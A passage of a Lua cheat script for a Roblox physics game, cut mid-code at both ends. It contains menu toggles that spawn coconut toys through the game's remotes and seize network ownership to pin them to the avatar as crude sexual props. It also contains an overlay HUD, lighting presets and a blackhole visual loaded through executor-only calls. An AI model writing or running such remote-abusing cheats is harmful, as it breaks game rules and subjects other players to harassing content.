                            local Coconut = Coconuts[i]
                            local Part = Coconut:FindFirstChild("SoundPart")
                            local HoldPart = Coconut:FindFirstChild("HoldPart")
                            local Rigid = HoldPart and HoldPart:FindFirstChild("RigidConstraint")
                            local PartOwner = Part and Part:FindFirstChild("PartOwner")
                            if Part and HoldPart and Rigid then
                                if PartOwner and PartOwner.Value == Me.Name then
                                    local TargetCF
                                    if i == 1 then
                                        TargetCF = Root.CFrame * CFrame.new(-0.4, 0.3, -0.55)
                                    else
                                        TargetCF = Root.CFrame * CFrame.new(0.4, 0.3, -0.55)
                                    end
                                    Part.CFrame = TargetCF
                                    Part.Velocity = Vector3.zero
                                else
                                    KozDisp:Fire(SetNetworkOwner, Part, Part.CFrame)
                                end
                                if Rigid.Attachment1 then
                                    KozDisp:Fire(DestroyToy, Coconut)
                                end
                                for _, PartObj in ipairs(Coconut:GetChildren()) do
                                    if PartObj:IsA("BasePart") then
                                        PartObj.CanCollide = false
                                        PartObj.CanQuery = false
                                        if PartObj.Transparency ~= 1 then
                                            PartObj.Transparency = 0
                                        end
                                    end
                                end
                            end
                        end
                        task.wait(0.01)
                    end
                end)
        end
    })
    FunGroup:AddToggle("KozCoconutAss", {
        Text = "Coconut Ass",
        Default = false,
        Callback = function(v)
            KozFlags.coconutAss = v
            if not v then
                if KozState.coconutAssTask then task.cancel(KozState.coconutAssTask) KozState.coconutAssTask = nil end
                return
            end
            KozState.coconutAssTask = task.spawn(function()
                    local Me = KozPLR
                    local SetNetworkOwner = KozRemote.SetNetworkOwner
                    local SpawnToy = KozRemote.SpawnToyRemoteFunction
                    local DestroyToy = KozRemote.DestroyToy
                    local Coconuts = {}
                    while KozFlags.coconutAss do
                        local Character = Me.Character
                        local Root = Character and Character:FindFirstChild("HumanoidRootPart")
                        if not Root then
                            task.wait(0.1)
                            continue
                        end
                        local Folder = KozWS:FindFirstChild(Me.Name .. "SpawnedInToys")
                        if not Folder then
                            task.wait(0.1)
                            continue
                        end
                        table.clear(Coconuts)
                        for _, Toy in ipairs(Folder:GetChildren()) do
                            if Toy.Name == "FoodCoconut" and Toy:GetAttribute("CoconutRole") == "Ass" then
                                table.insert(Coconuts, Toy)
                            end
                        end
                        if #Coconuts < 2 then
                            for _, Toy in ipairs(Folder:GetChildren()) do
                                if Toy.Name == "FoodCoconut" and Toy:GetAttribute("CoconutRole") == nil then
                                    Toy:SetAttribute("CoconutRole", "Ass")
                                    table.insert(Coconuts, Toy)
                                    if #Coconuts >= 2 then break end
                                end
                            end
                        end
                        if #Coconuts < 2 then
                            for _ = 1, 2 - #Coconuts do
                                task.spawn(function()
                                        local toy = KozDisp:InvokeSync(SpawnToy, "FoodCoconut", Root.CFrame * CFrame.new(-5, 0, 10), Vector3.zero)
                                        pcall(function()
                                                if toy and toy:IsA("Instance") then toy:SetAttribute("CoconutRole", "Ass") end
                                            end)
                                    end)
                            end
                        end
                        for i = 1, math.min(2, #Coconuts) do
                            local Coconut = Coconuts[i]
                            local Part = Coconut:FindFirstChild("SoundPart")
                            local HoldPart = Coconut:FindFirstChild("HoldPart")
                            local Rigid = HoldPart and HoldPart:FindFirstChild("RigidConstraint")
                            local PartOwner = Part and Part:FindFirstChild("PartOwner")
                            if Part and HoldPart and Rigid then
                                if PartOwner and PartOwner.Value == Me.Name then
                                    local TargetCF
                                    if i == 1 then
                                        TargetCF = Root.CFrame * CFrame.new(-0.35, -1.1, 0.45)
                                    else
                                        TargetCF = Root.CFrame * CFrame.new(0.35, -1.1, 0.45)
                                    end
                                    Part.CFrame = TargetCF
                                    Part.Velocity = Vector3.zero
                                else
                                    KozDisp:Fire(SetNetworkOwner, Part, Part.CFrame)
                                end
                                if Rigid.Attachment1 then
                                    KozDisp:Fire(DestroyToy, Coconut)
                                end
                                for _, PartObj in ipairs(Coconut:GetChildren()) do
                                    if PartObj:IsA("BasePart") then
                                        PartObj.CanCollide = false
                                        PartObj.CanQuery = false
                                        if PartObj.Transparency ~= 1 then
                                            PartObj.Transparency = 0
                                        end
                                    end
                                end
                            end
                        end
                        task.wait(0.01)
                    end
                end)
        end
    })
end

-- =====================================================================
-- [KOZMOZ PORT] HUD kutusu: Spisok + Info Hud
-- musa(4) kaynagindan tasiindi; Obsidian elemanlarina uyarlandi ve
-- musa'daki davranisin tamami (durum + yardimci fonksiyonlar) korundu.
-- =====================================================================
HudGroup = Tabs.AurasTab:AddLeftGroupbox("HUD", "monitor")
do
    HudGroup:AddToggle("KozToyList", {
        Text = "Spisok",
        Default = false,
        Callback = function(value)
            KozFlags.toyList = value
            if value then
                if KozFlags.refreshToolList then KozFlags.refreshToolList() end
            else
                local gui = Services.PlayerGui:FindFirstChild("ToolInventory")
                if gui then
                    local mf = gui:FindFirstChild("MainFrame")
                    if mf then mf.Visible = false end
                end
            end
        end
    })
    do
    local infoHudStart = os.time()
    local infoGui = Instance.new("ScreenGui")
    infoGui.Name = "InfoHudGui"
    infoGui.ResetOnSpawn = false
    infoGui.DisplayOrder = 10
    infoGui.Parent = Services.CoreGui
    local infoFrame = Instance.new("Frame")
    infoFrame.Name = "InfoFrame"
    infoFrame.Size = UDim2.new(0, 240, 0, 76)
    infoFrame.Position = UDim2.new(0, 12, 0, 12)
    infoFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 20)
    infoFrame.BackgroundTransparency = 0.3
    infoFrame.BorderSizePixel = 0
    infoFrame.Visible = false
    infoFrame.Parent = infoGui
    Instance.new("UICorner", infoFrame).CornerRadius = UDim.new(0, 6)
    local infoLayout = Instance.new("UIListLayout")
    infoLayout.Padding = UDim.new(0, 2)
    infoLayout.SortOrder = Enum.SortOrder.LayoutOrder
    infoLayout.Parent = infoFrame
    local infoPadding = Instance.new("UIPadding")
    infoPadding.PaddingTop = UDim.new(0, 6)
    infoPadding.PaddingLeft = UDim.new(0, 10)
    infoPadding.PaddingRight = UDim.new(0, 10)
    infoPadding.Parent = infoFrame
    local function makeInfoLabel(text, order)
        local lbl = Instance.new("TextLabel")
        lbl.Size = UDim2.new(1, 0, 0, 18)
        lbl.BackgroundTransparency = 1
        lbl.Text = text
        lbl.TextColor3 = Color3.fromRGB(210, 210, 215)
        lbl.Font = Enum.Font.GothamMedium
        lbl.TextSize = 13
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.LayoutOrder = order
        lbl.Parent = infoFrame
        return lbl
    end
    local infoPlayerName = makeInfoLabel("Player: " .. KozPLR.Name, 1)
    local infoPlayers = makeInfoLabel("Players: ...", 2)
    local infoPlaytime = makeInfoLabel("Session: 00h 00m 00s", 3)
    local chatDefaultPos = UDim2.new(0, 12, 0, 12)
    local chatOpenPos = UDim2.new(0, 12, 0, 200)
    local function onChatFocus()
        infoFrame.Position = chatOpenPos
    end
    local function onChatUnfocus()
        infoFrame.Position = chatDefaultPos
    end
    local function hookChatDetection()
        local chatGui = Services.PlayerGui:FindFirstChild("Chat")
        if not chatGui then return end
        for _, desc in ipairs(chatGui:GetDescendants()) do
            if desc:IsA("TextBox") then
                desc.Focused:Connect(onChatFocus)
                desc.FocusLost:Connect(onChatUnfocus)
            end
        end
        chatGui.DescendantAdded:Connect(function(desc)
            if desc:IsA("TextBox") then
                desc.Focused:Connect(onChatFocus)
                desc.FocusLost:Connect(onChatUnfocus)
            end
        end)
    end
    hookChatDetection()
    KozRun.Heartbeat:Connect(function()
        if not infoFrame.Visible then return end
        infoPlayers.Text = "Players: " .. tostring(#KozPlayers:GetPlayers())
        local sessionSec = os.time() - infoHudStart
        local sH = math.floor(sessionSec / 3600)
        local sM = math.floor((sessionSec % 3600) / 60)
        local sS = sessionSec % 60
        infoPlaytime.Text = string.format("Session: %02dh %02dm %02ds", sH, sM, sS)
    end)
    KozFlags.infoHud = false
    HudGroup:AddToggle("KozInfoHud", {
        Text = "Info Hud",
        Default = false,
        Callback = function(value)
            KozFlags.infoHud = value
            infoFrame.Visible = value
        end
    })
    end
end

Custom = Tabs.VisualTab:AddLeftGroupbox("Customs", "galaxy")
ESP = Tabs.VisualTab:AddRightGroupbox("ESP", "eye")

ShadersGroup = Tabs.VisualTab:AddRightGroupbox("Shaders", "palette")

ShaderEnabled = false
SelectedShader = "Majestic"

currentShaderEffects = {}
originalLighting = {}

function saveOriginalLighting()
    lighting = game:GetService("Lighting")
    originalLighting = {
        Brightness = lighting.Brightness,
        ClockTime = lighting.ClockTime,
        FogEnd = lighting.FogEnd,
        FogStart = lighting.FogStart,
        FogColor = lighting.FogColor,
        Ambient = lighting.Ambient,
        OutdoorAmbient = lighting.OutdoorAmbient,
        GlobalShadows = lighting.GlobalShadows,
        EnvironmentDiffuseScale = lighting.EnvironmentDiffuseScale,
        EnvironmentSpecularScale = lighting.EnvironmentSpecularScale,
        Technology = lighting.Technology
    }
end

function resetShaders()
    lighting = game:GetService("Lighting")
    for _, effect in pairs(currentShaderEffects) do
        pcall(function() effect:Destroy() end)
    end
    currentShaderEffects = {}
    for prop, value in pairs(originalLighting) do
        pcall(function() lighting[prop] = value end)
    end
end

function applyWinterShader()
    lighting = game:GetService("Lighting")
    lighting.Brightness = 0.8
    lighting.ClockTime = 10
    lighting.FogEnd = 200
    lighting.FogStart = 50
    lighting.FogColor = Color3.fromRGB(180, 200, 230)
    lighting.Ambient = Color3.fromRGB(100, 120, 150)
    lighting.OutdoorAmbient = Color3.fromRGB(120, 140, 170)
    lighting.GlobalShadows = true
    lighting.EnvironmentDiffuseScale = 0.8
    lighting.EnvironmentSpecularScale = 0.5
    colorCorrection = Instance.new("ColorCorrectionEffect")
    colorCorrection.TintColor = Color3.fromRGB(180, 200, 240)
    colorCorrection.Saturation = 0.7
    colorCorrection.Parent = lighting
    table.insert(currentShaderEffects, colorCorrection)
    atmosphere = Instance.new("Atmosphere")
    atmosphere.Density = 0.3
    atmosphere.Offset = 0.2
    atmosphere.Color = Color3.fromRGB(200, 210, 240)
    atmosphere.Decay = Color3.fromRGB(180, 190, 220)
    atmosphere.Parent = lighting
    table.insert(currentShaderEffects, atmosphere)
end

function applySummerShader()
    lighting = game:GetService("Lighting")
    lighting.Brightness = 1.5
    lighting.ClockTime = 14.5
    lighting.FogEnd = 100000
    lighting.FogStart = 100000
    lighting.FogColor = Color3.fromRGB(255, 240, 150)
    lighting.Ambient = Color3.fromRGB(200, 180, 140)
    lighting.OutdoorAmbient = Color3.fromRGB(220, 200, 160)
    lighting.GlobalShadows = false
    lighting.EnvironmentDiffuseScale = 1.5
    lighting.EnvironmentSpecularScale = 0.2
    colorCorrection = Instance.new("ColorCorrectionEffect")
    colorCorrection.TintColor = Color3.fromRGB(255, 235, 130)
    colorCorrection.Saturation = 1.3
    colorCorrection.Contrast = 0
    colorCorrection.Brightness = 0.1
    colorCorrection.Parent = lighting
    table.insert(currentShaderEffects, colorCorrection)
    bloom = Instance.new("BloomEffect")
    bloom.Intensity = 0.35
    bloom.Size = 55
    bloom.Threshold = 0.75
    bloom.Parent = lighting
    table.insert(currentShaderEffects, bloom)
end

function applyMajesticShader()
    lighting = game:GetService("Lighting")
    lighting.Brightness = 1.0
    lighting.ClockTime = 17
    lighting.FogEnd = 400
    lighting.FogStart = 80
    lighting.FogColor = Color3.fromRGB(255, 200, 150)
    lighting.Ambient = Color3.fromRGB(120, 100, 80)
    lighting.OutdoorAmbient = Color3.fromRGB(150, 130, 100)
    lighting.GlobalShadows = true
    lighting.EnvironmentDiffuseScale = 1.0
    lighting.EnvironmentSpecularScale = 0.9
    colorCorrection = Instance.new("ColorCorrectionEffect")
    colorCorrection.TintColor = Color3.fromRGB(255, 220, 150)
    colorCorrection.Saturation = 1.2
    colorCorrection.Contrast = 0.1
    colorCorrection.Brightness = 0.05
    colorCorrection.Parent = lighting
    table.insert(currentShaderEffects, colorCorrection)
    bloom = Instance.new("BloomEffect")
    bloom.Intensity = 0.5
    bloom.Size = 70
    bloom.Threshold = 0.6
    bloom.Parent = lighting
    table.insert(currentShaderEffects, bloom)
    sunRays = Instance.new("SunRaysEffect")
    sunRays.Intensity = 0.25
    sunRays.Spread = 0.7
    sunRays.Parent = lighting
    table.insert(currentShaderEffects, sunRays)
    atmosphere = Instance.new("Atmosphere")
    atmosphere.Density = 0.25
    atmosphere.Offset = 0.15
    atmosphere.Color = Color3.fromRGB(255, 200, 150)
    atmosphere.Decay = Color3.fromRGB(200, 150, 100)
    atmosphere.Glare = 0.2
    atmosphere.Parent = lighting
    table.insert(currentShaderEffects, atmosphere)
end

function applyNightShader()
    lighting = game:GetService("Lighting")
    lighting.Brightness = 0.5
    lighting.ClockTime = 1
    lighting.FogEnd = 100000
    lighting.FogStart = 100000
    lighting.FogColor = Color3.fromRGB(100, 110, 140)
    lighting.Ambient = Color3.fromRGB(80, 85, 105)
    lighting.OutdoorAmbient = Color3.fromRGB(90, 100, 120)
    lighting.GlobalShadows = false
    lighting.EnvironmentDiffuseScale = 0.7
    lighting.EnvironmentSpecularScale = 0.5
    colorCorrection = Instance.new("ColorCorrectionEffect")
    colorCorrection.TintColor = Color3.fromRGB(120, 140, 200)
    colorCorrection.Saturation = 0.5
    colorCorrection.Brightness = 0.08
    colorCorrection.Parent = lighting
    table.insert(currentShaderEffects, colorCorrection)
    bloom = Instance.new("BloomEffect")
    bloom.Intensity = 0.15
    bloom.Size = 45
    bloom.Threshold = 0.65
    bloom.Parent = lighting
    table.insert(currentShaderEffects, bloom)
end

function applySunsetShader()
    lighting = game:GetService("Lighting")
    lighting.Brightness = 1.0
    lighting.ClockTime = 17
    lighting.FogEnd = 400
    lighting.FogStart = 80
    lighting.FogColor = Color3.fromRGB(255, 200, 150)
    lighting.Ambient = Color3.fromRGB(120, 100, 80)
    lighting.OutdoorAmbient = Color3.fromRGB(150, 130, 100)
    lighting.GlobalShadows = true
    lighting.EnvironmentDiffuseScale = 1.0
    lighting.EnvironmentSpecularScale = 0.9
    bloom = Instance.new("BloomEffect")
    bloom.Intensity = 0.5
    bloom.Size = 70
    bloom.Threshold = 0.6
    bloom.Parent = lighting
    table.insert(currentShaderEffects, bloom)
    sunRays = Instance.new("SunRaysEffect")
    sunRays.Intensity = 0.25
    sunRays.Spread = 0.7
    sunRays.Parent = lighting
    table.insert(currentShaderEffects, sunRays)
    atmosphere = Instance.new("Atmosphere")
    atmosphere.Density = 0.25
    atmosphere.Offset = 0.15
    atmosphere.Color = Color3.fromRGB(255, 200, 150)
    atmosphere.Decay = Color3.fromRGB(200, 150, 100)
    atmosphere.Glare = 0.2
    atmosphere.Parent = lighting
    table.insert(currentShaderEffects, atmosphere)
    colorCorrection = Instance.new("ColorCorrectionEffect")
    colorCorrection.TintColor = Color3.fromRGB(255, 190, 150)
    colorCorrection.Saturation = 1.05
    colorCorrection.Contrast = 0.03
    colorCorrection.Brightness = 0.01
    colorCorrection.Parent = lighting
    table.insert(currentShaderEffects, colorCorrection)
end

function applyCyberpunkShader()
    lighting = game:GetService("Lighting")
    lighting.Brightness = 1.1
    lighting.ClockTime = 20.5
    lighting.FogEnd = 100000
    lighting.FogStart = 100000
    lighting.FogColor = Color3.fromRGB(100, 50, 150)
    lighting.Ambient = Color3.fromRGB(60, 40, 100)
    lighting.OutdoorAmbient = Color3.fromRGB(70, 50, 110)
    lighting.GlobalShadows = false
    lighting.EnvironmentDiffuseScale = 0.9
    lighting.EnvironmentSpecularScale = 1.3
    colorCorrection = Instance.new("ColorCorrectionEffect")
    colorCorrection.TintColor = Color3.fromRGB(180, 80, 255)
    colorCorrection.Saturation = 1.4
    colorCorrection.Contrast = 0.15
    colorCorrection.Brightness = 0.05
    colorCorrection.Parent = lighting
    table.insert(currentShaderEffects, colorCorrection)
    bloom = Instance.new("BloomEffect")
    bloom.Intensity = 0.7
    bloom.Size = 75
    bloom.Threshold = 0.5
    bloom.Parent = lighting
    table.insert(currentShaderEffects, bloom)
    bloom2 = Instance.new("BloomEffect")
    bloom2.Intensity = 0.35
    bloom2.Size = 90
    bloom2.Threshold = 0.6
    bloom2.Parent = lighting
    table.insert(currentShaderEffects, bloom2)
    sunRays = Instance.new("SunRaysEffect")
    sunRays.Intensity = 0.2
    sunRays.Spread = 0.8
    sunRays.Parent = lighting
    table.insert(currentShaderEffects, sunRays)
    atmosphere = Instance.new("Atmosphere")
    atmosphere.Density = 0.15
    atmosphere.Offset = 0.1
    atmosphere.Color = Color3.fromRGB(180, 100, 255)
    atmosphere.Decay = Color3.fromRGB(150, 80, 200)
    atmosphere.Glare = 0.4
    atmosphere.Parent = lighting
    table.insert(currentShaderEffects, atmosphere)
end

function applyCandyShader()
    lighting = game:GetService("Lighting")
    lighting.Brightness = 1.2
    lighting.ClockTime = 15
    lighting.FogEnd = 100000
    lighting.FogStart = 100000
    lighting.FogColor = Color3.fromRGB(255, 200, 220)
    lighting.Ambient = Color3.fromRGB(180, 140, 180)
    lighting.OutdoorAmbient = Color3.fromRGB(200, 160, 200)
    lighting.GlobalShadows = false
    lighting.EnvironmentDiffuseScale = 1.1
    lighting.EnvironmentSpecularScale = 0.8
    colorCorrection = Instance.new("ColorCorrectionEffect")
    colorCorrection.TintColor = Color3.fromRGB(255, 150, 200)
    colorCorrection.Saturation = 1.25
    colorCorrection.Contrast = 0.08
    colorCorrection.Brightness = 0.06
    colorCorrection.Parent = lighting
    table.insert(currentShaderEffects, colorCorrection)
    bloom = Instance.new("BloomEffect")
    bloom.Intensity = 0.5
    bloom.Size = 65
    bloom.Threshold = 0.6
    bloom.Parent = lighting
    table.insert(currentShaderEffects, bloom)
    atmosphere = Instance.new("Atmosphere")
    atmosphere.Density = 0.2
    atmosphere.Offset = 0.12
    atmosphere.Color = Color3.fromRGB(255, 180, 220)
    atmosphere.Decay = Color3.fromRGB(220, 150, 200)
    atmosphere.Glare = 0.25
    atmosphere.Parent = lighting
    table.insert(currentShaderEffects, atmosphere)
end

function applyDesertShader()
    lighting = game:GetService("Lighting")
    lighting.Brightness = 1.3
    lighting.ClockTime = 13.5
    lighting.FogEnd = 100000
    lighting.FogStart = 100000
    lighting.FogColor = Color3.fromRGB(255, 200, 120)
    lighting.Ambient = Color3.fromRGB(180, 140, 90)
    lighting.OutdoorAmbient = Color3.fromRGB(210, 170, 110)
    lighting.GlobalShadows = false
    lighting.EnvironmentDiffuseScale = 1.2
    lighting.EnvironmentSpecularScale = 0.6
    colorCorrection = Instance.new("ColorCorrectionEffect")
    colorCorrection.TintColor = Color3.fromRGB(255, 180, 100)
    colorCorrection.Saturation = 1.15
    colorCorrection.Contrast = 0.1
    colorCorrection.Brightness = 0.07
    colorCorrection.Parent = lighting
    table.insert(currentShaderEffects, colorCorrection)
    bloom = Instance.new("BloomEffect")
    bloom.Intensity = 0.4
    bloom.Size = 60
    bloom.Threshold = 0.65
    bloom.Parent = lighting
    table.insert(currentShaderEffects, bloom)
    sunRays = Instance.new("SunRaysEffect")
    sunRays.Intensity = 0.3
    sunRays.Spread = 0.7
    sunRays.Parent = lighting
    table.insert(currentShaderEffects, sunRays)
    atmosphere = Instance.new("Atmosphere")
    atmosphere.Density = 0.22
    atmosphere.Offset = 0.15
    atmosphere.Color = Color3.fromRGB(255, 200, 130)
    atmosphere.Decay = Color3.fromRGB(230, 170, 100)
    atmosphere.Glare = 0.3
    atmosphere.Parent = lighting
    table.insert(currentShaderEffects, atmosphere)
end

function applyForestShader()
    lighting = game:GetService("Lighting")
    lighting.Brightness = 0.75
    lighting.ClockTime = 12
    lighting.FogEnd = 100000
    lighting.FogStart = 100000
    lighting.FogColor = Color3.fromRGB(140, 180, 120)
    lighting.Ambient = Color3.fromRGB(80, 110, 70)
    lighting.OutdoorAmbient = Color3.fromRGB(100, 140, 85)
    lighting.GlobalShadows = false
    lighting.EnvironmentDiffuseScale = 0.95
    lighting.EnvironmentSpecularScale = 0.7
    colorCorrection = Instance.new("ColorCorrectionEffect")
    colorCorrection.TintColor = Color3.fromRGB(100, 180, 80)
    colorCorrection.Saturation = 1.1
    colorCorrection.Contrast = 0.05
    colorCorrection.Brightness = 0.02
    colorCorrection.Parent = lighting
    table.insert(currentShaderEffects, colorCorrection)
    bloom = Instance.new("BloomEffect")
    bloom.Intensity = 0.35
    bloom.Size = 55
    bloom.Threshold = 0.7
    bloom.Parent = lighting
    table.insert(currentShaderEffects, bloom)
    sunRays = Instance.new("SunRaysEffect")
    sunRays.Intensity = 0.18
    sunRays.Spread = 0.6
    sunRays.Parent = lighting
    table.insert(currentShaderEffects, sunRays)
    atmosphere = Instance.new("Atmosphere")
    atmosphere.Density = 0.2
    atmosphere.Offset = 0.12
    atmosphere.Color = Color3.fromRGB(120, 200, 100)
    atmosphere.Decay = Color3.fromRGB(80, 150, 60)
    atmosphere.Glare = 0.15
    atmosphere.Parent = lighting
    table.insert(currentShaderEffects, atmosphere)
end

function applyHorrorShader()
    lighting = game:GetService("Lighting")
    lighting.Brightness = 0.75
    lighting.ClockTime = 0.5
    lighting.FogEnd = 200
    lighting.FogStart = 0
    lighting.FogColor = Color3.fromRGB(150, 60, 60)
    lighting.Ambient = Color3.fromRGB(70, 45, 50)
    lighting.OutdoorAmbient = Color3.fromRGB(85, 55, 60)
    lighting.GlobalShadows = true
    lighting.EnvironmentDiffuseScale = 0.7
    lighting.EnvironmentSpecularScale = 0.4
    colorCorrection = Instance.new("ColorCorrectionEffect")
    colorCorrection.TintColor = Color3.fromRGB(180, 80, 80)
    colorCorrection.Saturation = 1.15
    colorCorrection.Contrast = 0.12
    colorCorrection.Brightness = 0.02
    colorCorrection.Parent = lighting
    table.insert(currentShaderEffects, colorCorrection)
    bloom = Instance.new("BloomEffect")
    bloom.Intensity = 0.25
    bloom.Size = 50
    bloom.Threshold = 0.55
    bloom.Parent = lighting
    table.insert(currentShaderEffects, bloom)
    atmosphere = Instance.new("Atmosphere")
    atmosphere.Density = 0.35
    atmosphere.Offset = 0.2
    atmosphere.Color = Color3.fromRGB(180, 80, 80)
    atmosphere.Decay = Color3.fromRGB(140, 60, 60)
    atmosphere.Glare = 0.15
    atmosphere.Parent = lighting
    table.insert(currentShaderEffects, atmosphere)
end

function applyShader(shaderName)
    resetShaders()
    if shaderName == "Winter" then
        applyWinterShader()
    elseif shaderName == "Summer" then
        applySummerShader()
    elseif shaderName == "Majestic" then
        applyMajesticShader()
    elseif shaderName == "Sunset" then
        applySunsetShader()
    elseif shaderName == "Night" then
        applyNightShader()
    elseif shaderName == "Cyberpunk" then
        applyCyberpunkShader()
    elseif shaderName == "Candy" then
        applyCandyShader()
    elseif shaderName == "Desert" then
        applyDesertShader()
    elseif shaderName == "Forest" then
        applyForestShader()
    elseif shaderName == "Horror" then
        applyHorrorShader()
    end
end

function toggleShader(enabled)
    ShaderEnabled = enabled
    if enabled then
        applyShader(SelectedShader)
    else
        resetShaders()
    end
end

function changeShader(shaderName)
    SelectedShader = shaderName
    if ShaderEnabled then
        applyShader(shaderName)
    end
end

saveOriginalLighting()

ShadersGroup:AddToggle("ShaderToggle", {
    Text = "Enable Shaders",
    Default = false,
    Callback = function(Value)
        toggleShader(Value)
    end
})

ShadersGroup:AddDropdown("ShaderDropdown", {
    Text = "Shader Selection",
    Values = {"Winter", "Summer", "Majestic", "Sunset", "Night", "Cyberpunk", "Candy", "Desert", "Forest", "Horror"},
    Default = "Majestic",
    Callback = function(Value)
        changeShader(Value)
    end
})

ShadersGroup:AddButton({
    Text = "Reset to Default",
    Func = function()
        if ShaderEnabled then
            ShaderEnabled = false
        end
        resetShaders()
    end
})

CosmicBlackhole = {
    Enabled = false,
    Active = {},
    Connection = nil,
    Selected = "None",
    Options = {
        ["Purple Cosmic Blackhole"] = {Id = "rbxassetid://13481688755", Scale = 0.75, Type = "model"},
        ["EternityHole"] = {Id = "rbxassetid://99340233207059", Scale = 1.0, Type = "model"},
        ["Custom Blackhole"] = {Id = "rbxassetid://18882467235", Scale = 50.0, Type = "decal"},
    },
}

function WipeOriginal(bh)
    if not bh then return end
    for _, desc in ipairs(bh:GetDescendants()) do
        if desc:IsA("BasePart") or desc:IsA("MeshPart") or desc:IsA("UnionOperation") then
            desc.Transparency = 1
            desc.CastShadow = false
        elseif desc:IsA("ParticleEmitter") or desc:IsA("Trail") or desc:IsA("Beam") or desc:IsA("Smoke") or desc:IsA("Fire") or desc:IsA("Sparkles") then
            desc.Enabled = false
        elseif desc:IsA("PointLight") or desc:IsA("SpotLight") or desc:IsA("SurfaceLight") then
            desc.Enabled = false
        elseif desc:IsA("Decal") or desc:IsA("Texture") then
            desc.Transparency = 1
        elseif desc:IsA("BillboardGui") or desc:IsA("SurfaceGui") then
            desc.Enabled = false
        end
    end
    if bh:IsA("BasePart") then
        bh.Transparency = 1
    end
    if bh:IsA("Model") and bh.PrimaryPart then
        bh.PrimaryPart.Transparency = 1
    end
end

function RestoreOriginal(bh)
    if not bh then return end
    for _, desc in ipairs(bh:GetDescendants()) do
        if desc:IsA("BasePart") or desc:IsA("MeshPart") or desc:IsA("UnionOperation") then
            desc.Transparency = 0
        elseif desc:IsA("ParticleEmitter") or desc:IsA("Trail") or desc:IsA("Beam") or desc:IsA("Smoke") or desc:IsA("Fire") or desc:IsA("Sparkles") then
            desc.Enabled = true
        elseif desc:IsA("PointLight") or desc:IsA("SpotLight") or desc:IsA("SurfaceLight") then
            desc.Enabled = true
        elseif desc:IsA("Decal") or desc:IsA("Texture") then
            desc.Transparency = 0
        elseif desc:IsA("BillboardGui") or desc:IsA("SurfaceGui") then
            desc.Enabled = true
        end
    end
    if bh:IsA("BasePart") then
        bh.Transparency = 0
    end
    if bh:IsA("Model") and bh.PrimaryPart then
        bh.PrimaryPart.Transparency = 0
    end
end

function Cleanup(bh)
    if not bh then return end
    data = CosmicBlackhole.Active[bh]
    if not data then return end
    if data.Anim then
        pcall(function() data.Anim:Disconnect() end)
    end
    if data.Model then
        pcall(function() data.Model:Destroy() end)
    end
    RestoreOriginal(bh)
    CosmicBlackhole.Active[bh] = nil
end

function Build(bh)
    if not bh or not bh.Parent then return end
    if CosmicBlackhole.Active[bh] then return end
    hole = bh:FindFirstChild("Hole") or bh:FindFirstChildWhichIsA("BasePart")
    if not hole then
        return
    end
    WipeOriginal(bh)
    pos = hole.Position
    option = CosmicBlackhole.Options[CosmicBlackhole.Selected] or CosmicBlackhole.Options["Purple Cosmic Blackhole"]
    data = {
        Time = 0,
        Hole = hole,
        Anim = nil,
        Model = nil,
        SpinSpeed = 0,
        TargetSpin = 0.8,
        Scale = 0,
        TargetScale = option.Scale,
        StartTime = tick(),
    }
    assetId = option.Id
    model = nil
    if option.Type == "decal" then
        cleanId = tonumber((assetId:gsub("rbxassetid://", "")))
        success, result = pcall(function()
            return game:GetService("MarketplaceService"):GetProductInfo(cleanId)
        end)
        imageId = nil
        if success and result and result.IconImageAssetId and result.IconImageAssetId ~= 0 then
            imageId = result.IconImageAssetId
        end
        if not imageId then
            imageId = cleanId
        end
        thumbUrl = "rbxthumb://type=Asset&id=" .. tostring(imageId) .. "&w=420&h=420"
        decalPart = Instance.new("Part")
        decalPart.Anchored = true
        decalPart.CanCollide = false
        decalPart.CastShadow = false
        decalPart.Transparency = 1
        decalPart.Size = Vector3.new(1, 1, 1)
        decalPart.CFrame = CFrame.new(pos)
        decalPart.Parent = bh
        billboard = Instance.new("BillboardGui")
        billboard.Size = UDim2.new(option.Scale, 0, option.Scale, 0)
        billboard.AlwaysOnTop = true
        billboard.Parent = decalPart
        imageLabel = Instance.new("ImageLabel")
        imageLabel.Size = UDim2.new(1, 0, 1, 0)
        imageLabel.BackgroundTransparency = 1
        imageLabel.Image = thumbUrl
        imageLabel.Parent = billboard
        model = decalPart
    else
        success, result = pcall(function()
            return game:GetObjects(assetId)[1]
        end)
        if success and result then
            model = result
        end
        if not model then
            cleanId = tonumber((assetId:gsub("rbxassetid://", "")))
            success, result = pcall(function()
                return game:GetService("InsertService"):LoadAsset(cleanId)
            end)
            if success and result then
                model = result:GetChildren()[1]
            end
        end
        if not model then
            success, result = pcall(function()
                mp = Instance.new("MeshPart")
                mp.MeshId = assetId
                return mp
            end)
            if success and result then
                model = result
            end
        end
    end
    if not model then
        RestoreOriginal(bh)
        return
    end
    model.Parent = bh
    model.Name = "CosmicMesh"
    for _, desc in ipairs(model:GetDescendants()) do
        if desc:IsA("AnimationController") or desc:IsA("Animator") or desc:IsA("Animation") then
            desc:Destroy()
        end
    end
    if CosmicBlackhole.Selected == "Purple Cosmic Blackhole" then
        for _, desc in ipairs(model:GetDescendants()) do
            if desc:IsA("PointLight") or desc:IsA("SpotLight") or desc:IsA("SurfaceLight") then
                desc:Destroy()
            elseif desc:IsA("ParticleEmitter") then
                desc.LightEmission = 0
                desc.Rate = desc.Rate * 0.2
                if desc.Brightness then
                    desc.Brightness = desc.Brightness * 0.1
                end
            elseif desc:IsA("Trail") or desc:IsA("Beam") then
                desc.LightEmission = 0
            elseif desc:IsA("Fire") or desc:IsA("Sparkles") then
                desc:Destroy()
            elseif desc:IsA("BasePart") or desc:IsA("MeshPart") then
                if desc.Material == Enum.Material.Neon then
                    desc.Material = Enum.Material.SmoothPlastic
                end
            end
        end
    end
    if option.Type == "decal" then
        data.Model = model
        data.Anim = RunService.Heartbeat:Connect(function(dt)
            if not bh or not bh.Parent then
                Cleanup(bh)
                return
            end
            currentPos = hole.Position
            data.Time = data.Time + dt * data.SpinSpeed
            if data.Model then
                data.Model.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, data.Time, 0)
                if not data.Model:GetAttribute("BaseSize") then
                    data.Model:SetAttribute("BaseSize", data.Model.Size)
                end
                baseSize = data.Model:GetAttribute("BaseSize")
                data.Model.Size = baseSize * data.Scale
                billboard = data.Model:FindFirstChildOfClass("BillboardGui")
                if billboard then
                    billboard.Size = UDim2.new(data.Scale, 0, data.Scale, 0)
                end
            end
        end)
    elseif model:IsA("Model") then
